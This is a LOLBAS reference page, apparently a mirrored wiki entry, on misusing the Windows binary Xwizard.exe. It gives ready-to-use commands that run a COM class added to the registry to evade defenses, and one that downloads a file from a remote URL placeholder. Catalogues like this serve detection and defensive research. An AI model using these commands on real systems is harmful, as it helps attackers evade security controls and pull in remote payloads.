# LOLBAS: Xwizard.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Download`, `Execute`

Execute custom class that has been added to the registry or download a file with Xwizard.exe

## Comandos

### Run a com object created in registry to evade defensive counter measures

Execute · priv: User · T1218

```cmd
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
```

Xwizard.exe running a custom class that has been added to the registry.

### Run a com object created in registry to evade defensive counter measures

Execute · priv: User · T1218

```cmd
xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
```

Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.

### Download file from Internet

Download · priv: User · T1105

```cmd
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
```

Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file, and save it to INetCache.

